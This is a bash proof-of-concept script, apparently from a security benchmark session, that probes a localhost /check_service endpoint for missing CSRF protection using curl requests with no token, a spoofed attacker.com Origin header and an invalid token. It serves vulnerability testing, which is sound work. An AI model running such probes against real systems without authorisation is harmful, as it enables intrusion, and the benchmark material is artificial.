#!/bin/bash
# POC: Demonstrates CSRF vulnerability on POST /check_service endpoint by making requests without CSRF tokens and from different origins
# Target: ./repo
# Created: 2025-11-07T19:18:47.925Z
# Session: benchmark-XBEN-068-24-mhp8iflp

# CSRF Vulnerability POC for POST /check_service Endpoint
# This script demonstrates the absence of CSRF protection on the endpoint

TARGET_URL="http://localhost:8080/check_service"
ATTACKER_ORIGIN="http://attacker.com"

echo "=========================================="
echo "CSRF Vulnerability POC - /check_service"
echo "=========================================="
echo ""

# Test 1: Make POST request without CSRF token
echo "[TEST 1] POST request without CSRF token"
echo "Command: curl -X POST $TARGET_URL -H 'Content-Type: application/json' -d '{\"service\": \"test\"}'"
echo ""
RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"service": "test"}' 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
BODY=$(echo "$RESPONSE" | grep -v "HTTP_CODE:")

echo "Response HTTP Code: $HTTP_CODE"
echo "Response Body: $BODY"
echo ""

# Test 2: Make POST request from different origin (simulating cross-site attack)
echo "[TEST 2] POST request with Origin header (attacker.com)"
echo "Command: curl -X POST $TARGET_URL -H 'Origin: $ATTACKER_ORIGIN' -H 'Content-Type: application/json' -d '{\"service\": \"test\"}'"
echo ""
RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET_URL" \
  -H "Origin: $ATTACKER_ORIGIN" \
  -H "Content-Type: application/json" \
  -d '{"service": "test"}' 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
BODY=$(echo "$RESPONSE" | grep -v "HTTP_CODE:")

echo "Response HTTP Code: $HTTP_CODE"
echo "Response Body: $BODY"
echo ""

# Test 3: Check if endpoint validates CSRF tokens
echo "[TEST 3] POST request with invalid CSRF token attempt"
echo "Command: curl -X POST $TARGET_URL -H 'X-CSRF-Token: invalid_token' -H 'Content-Type: application/json' -d '{\"service\": \"test\"}'"
echo ""
RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET_URL" \
  -H "X-CSRF-Token: invalid_token" \
  -H "Content-Type: application/json" \
  -d '{"service": "test"}' 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
BODY=$(echo "$RESPONSE" | grep -v "HTTP_CODE:")

echo "Response HTTP Code: $HTTP_CODE"
echo "Response Body: $BODY"
echo ""

# Test 4: Check OPTIONS request for CSRF-related headers
echo "[TEST 4] OPTIONS request to check for CSRF headers"
echo "Command: curl -v -X OPTIONS $TARGET_URL"
echo ""
RESPONSE=$(curl -s -i -X OPTIONS "$TARGET_URL" 2>&1)

echo "$RESPONSE" | head -20
echo ""

# Test 5: Verify endpoint doesn't require CSRF in response headers
echo "[TEST 5] Check root page for CSRF tokens"
echo "Command: curl http://localhost:8080/ | grep -i csrf"
echo ""
CSRF_CHECK=$(curl -s http://localhost:8080/ 2>/dev/null | grep -i csrf | head -5)

if [ -z "$CSRF_CHECK" ]; then
  echo "No CSRF tokens found in root page HTML"
else
  echo "CSRF tokens found: $CSRF_CHECK"
fi
echo ""

echo "=========================================="
echo "VULNERABILITY CONFIRMATION"
echo "=========================================="
echo "If all tests above show that:"
echo "1. POST requests are accepted without CSRF tokens"
echo "2. Requests with Origin headers are not rejected"
echo "3. Invalid CSRF tokens don't cause rejection"
echo "4. No CSRF-related security headers present"
echo ""
echo "Then the endpoint is VULNERABLE to CSRF attacks."
echo "=========================================="